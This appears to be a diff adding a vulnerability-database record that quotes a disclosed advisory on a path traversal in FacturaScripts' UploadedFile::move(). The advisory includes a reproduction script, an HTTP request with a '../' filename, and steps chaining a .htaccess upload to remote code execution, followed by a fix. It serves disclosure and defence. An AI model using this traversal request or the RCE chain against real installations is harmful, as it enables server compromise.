@@ -1,0 +1,210 @@
+[basic]
+description = '''
+## Summary
+
+`FacturaScripts\Core\UploadedFile::move($destiny, $destinyName)` concatenates `$destiny` and `$destinyName` without normalizing the resulting path. Every caller in the codebase passes `UploadedFile::getClientOriginalName()` — the unsanitized client-supplied filename — as `$destinyName`, so an authenticated user submitting a filename containing `../` segments can write the uploaded content to any directory writable by the web-server user, escaping the intended `MyFiles/` location.
+
+Because the shipped `htaccess-sample` (the documented production Apache configuration) excludes `Dinamic/Assets/` and `node_modules/` from the `index.php` rewrite, files written into those directories are served directly by Apache. Combined with `.htaccess` not being in `BLOCKED_EXTENSIONS`, the primitive escalates from arbitrary file write to remote code execution.
+
+## Vulnerable Code
+
+`Core/UploadedFile.php`:
+
+```php
+private const BLOCKED_EXTENSIONS = ['phar', 'php', 'php3', 'php4', 'php5', 'php7', 'php8', 'pht', 'phtml', 'phps'];
+
+public function move(string $destiny, string $destinyName): bool
+{
+    if (!$this->isValid()) {
+        return false;
+    }
+    if (substr($destiny, -1) !== DIRECTORY_SEPARATOR) {
+        $destiny .= DIRECTORY_SEPARATOR;
+    }
+    return $this->test ?
+        rename($this->tmp_name, $destiny . $destinyName) :
+        move_uploaded_file($this->tmp_name, $destiny . $destinyName);
+}
+
+public function getClientOriginalName(): string
+{
+    return $this->name ?? '';
+}
+```
+
+`isValid()` only checks the extension blocklist, the upload error code, and `is_uploaded_file()` — it never inspects the filename for directory separators or `..` segments.
+
+Six call sites pass the raw client filename straight into `move()`:
+
+- `Core/Controller/ApiUploadFiles.php:58` — `POST /api/3/uploadfiles`
+- `Core/Controller/ApiAttachedFiles.php:136` — `POST /api/3/attachedfiles`
+- `Core/Lib/Widget/WidgetFile.php:84` — every form using a file widget
+- `Core/Lib/Widget/WidgetLibrary.php:215` — library widget upload
+- `Core/Lib/ExtendedController/DocFilesTrait.php:51` — document files trait
+- `Core/Controller/AdminPlugins.php:260` — plugin (zip) upload
+
+Representative sink — `Core/Controller/ApiUploadFiles.php:56-79`:
+
+```php
+private function uploadFile(UploadedFile $uploadFile): ?AttachedFile
+{
+    if (false === $uploadFile->isValid()) {
+        return null;
+    }
+    $destiny = FS_FOLDER . '/MyFiles/';
+    $destinyName = $uploadFile->getClientOriginalName();
+    if (file_exists($destiny . $destinyName)) {
+        $destinyName = mt_rand(1, 999999) . '_' . $destinyName;
+    }
+    if ($uploadFile->move($destiny, $destinyName)) {
+        ...
+    }
+}
+```
+
+Shipped `htaccess-sample` (production Apache rules):
+
+```apache
+<IfModule mod_rewrite.c>
+   RewriteEngine On
+   RewriteBase /
+   RewriteCond %{REQUEST_URI} !Dinamic/Assets/ [NC]
+   RewriteCond %{REQUEST_URI} !node_modules/ [NC]
+   RewriteRule . index.php [L]
+</IfModule>
+```
+
+Apache therefore serves any file under `Dinamic/Assets/` directly, bypassing `index.php` entirely.
+
+## PoC
+
+### Step 1 — Static reproduction of the file-write primitive
+
+The following script replicates `UploadedFile::move()`'s `rename()` path verbatim inside a sandboxed temp directory. It does not run any payload — it only demonstrates that the destination escapes `MyFiles/` when the filename contains `../`.
+
+```php
+<?php
+$base = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'fs_verify_' . uniqid();
+mkdir($base);
+mkdir($base . '/MyFiles');
+mkdir($base . '/Dinamic');
+mkdir($base . '/Dinamic/Assets');
+
+$tmp = $base . '/tmp_upload.dat';
+file_put_contents($tmp, \"static-verification-marker\n\");
+
+function fs_move($tmp_name, $destiny, $destinyName) {
+    if (substr($destiny, -1) !== DIRECTORY_SEPARATOR) {
+        $destiny .= DIRECTORY_SEPARATOR;
+    }
+    return rename($tmp_name, $destiny . $destinyName);
+}
+
+fs_move($tmp, $base . '/MyFiles', '../Dinamic/Assets/traversed.txt');
+
+echo file_exists($base . '/Dinamic/Assets/traversed.txt')
+    ? \"WRITTEN OUTSIDE MyFiles\n\"
+    : \"blocked\n\";
+```
+
+Output:
+
+```
+WRITTEN OUTSIDE MyFiles
+```
+
+### Step 2 — Equivalent live HTTP request
+
+```http
+POST /api/3/uploadfiles HTTP/1.1
+Host: target
+Token: <valid-api-token>
+Content-Type: multipart/form-data; boundary=---X
+
+-----X
+Content-Disposition: form-data; name=\"files[]\"; filename=\"../Dinamic/Assets/traversed.txt\"
+Content-Type: text/plain
+
+static-verification-marker
+-----X--
+```
+
+After the request, `Dinamic/Assets/traversed.txt` exists on disk and is reachable at `https://target/Dinamic/Assets/traversed.txt` — Apache serves it directly because the path is excluded from the `index.php` rewrite.
+
+### Step 3 — Chain to code execution
+
+Because `.htaccess` is not in `BLOCKED_EXTENSIONS`, the same primitive can write an Apache override into `Dinamic/Assets/`:
+
+1. Upload with filename `../Dinamic/Assets/.htaccess` and body `AddType application/x-httpd-php .png`
+2. Upload with filename `../Dinamic/Assets/x.png` containing a PHP payload (extension `png` is not blocked, content is not validated by `isValid()`)
+3. Request `https://target/Dinamic/Assets/x.png` — Apache hands it to the PHP handler per the uploaded `.htaccess`
+
+## Root Cause
+
+`UploadedFile::move()` performs raw `$destiny . $destinyName` concatenation and trusts `getClientOriginalName()`, which returns `$this->name ?? ''` with no normalization. No call site applies `basename()` or any equivalent before passing the client filename to `move()`. The blocklist in `BLOCKED_EXTENSIONS` covers only PHP-family extensions and does not cover `htaccess`, which is required for the rewrite-excluded directory to be useful for code execution.
+
+## Impact
+
+Authenticated attacker (any role with permission to call one of the six upload entry points — including any user allowed to attach a file to a record, or any API token with `uploadfiles`/`attachedfiles` access) can:
+
+- Write arbitrary content to any path under the application root that is writable by the web-server user, including `Dinamic/Assets/` (Apache-direct-served) and `node_modules/`.
+- Overwrite shipped JS/CSS inside `Dinamic/Assets/`, injecting client-side script that executes in every administrator's browser → session takeover on next admin page load.
+- Drop a `.htaccess` into `Dinamic/Assets/` remapping a benign extension to the PHP handler, followed by a second upload that lands an executable payload — full remote code execution as the web-server user.
+
+The required precondition is only an authenticated session or API token with upload privileges, which is granted to a wide range of non-administrative roles in standard installations.
+
+## Fix
+
+Minimal fix — sanitize inside `UploadedFile::move()` so every call site is covered automatically:
+
+```php
+public function move(string $destiny, string $destinyName): bool
+{
+    if (!$this->isValid()) {
+        return false;
+    }
+    // strip any directory component from the client-supplied filename
+    $destinyName = basename($destinyName);
+    if (substr($destiny, -1) !== DIRECTORY_SEPARATOR) {
+        $destiny .= DIRECTORY_SEPARATOR;
+    }
+    return $this->test ?
+        rename($this->tmp_name, $destiny . $destinyName) :
+        move_uploaded_file($this->tmp_name, $destiny . $destinyName);
+}
+```
+
+Apply the same change in `moveTo()`.
+
+Recommended hardening in addition:
+
+- Add `htaccess`, `htm`, `html`, `shtml`, `phtm` to `BLOCKED_EXTENSIONS`, or replace the blocklist with an allowlist resolved per call site.
+- After concatenating the final destination, verify with `realpath()` that the result is still inside the intended base directory; abort otherwise.
+- Drop a `Deny from all` `.htaccess` (or equivalent web-server rule) into `MyFiles/` so even successfully written files cannot be requested directly without going through the application download endpoint (which already enforces `MyFilesToken`).
+
+## Status
+
+Reported privately to the maintainer via GitHub Security Advisory. Awaiting acknowledgement.
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "FacturaScripts: Path traversal in UploadedFile::move() via getClientOriginalName() — arbitrary file write outside MyFiles/ leading to   RCE"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-hgjx-r89m-m7v4"]
+ave_id = "AVE-2026-1127"
+
+[meta]
+collected_at = "2026-08-06T05:52:17.976041319+00:00"
+status = "completed"
+
+[references]
+urls = []
